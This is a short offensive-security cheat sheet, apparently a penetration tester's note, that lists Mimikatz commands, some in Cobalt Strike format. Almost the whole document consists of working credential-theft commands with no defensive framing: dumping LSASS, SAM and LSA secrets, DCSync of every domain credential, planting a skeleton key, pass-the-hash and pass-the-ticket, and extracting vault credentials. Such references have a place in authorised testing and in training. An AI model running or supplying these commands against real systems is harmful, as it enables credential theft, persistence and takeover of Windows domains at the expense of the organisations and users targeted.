# Mimikatz

Invoke-Mimikatz commands:
 - Interesting credentials such as those set for Scheduled Tasks are stored in the Credential Vault. These can be extracted using:
`Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'`
 - Dump hashes on target machines
`Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <targetserver>`
 - Skeleton Key
`Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
 - Dump hashes from SAM database (local users)
`Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'`

These are currently directly lifted from https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#powershell-remoting
I will add and edit as this cheatsheet progresses.

```
#The commands are in cobalt strike format!

#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list
```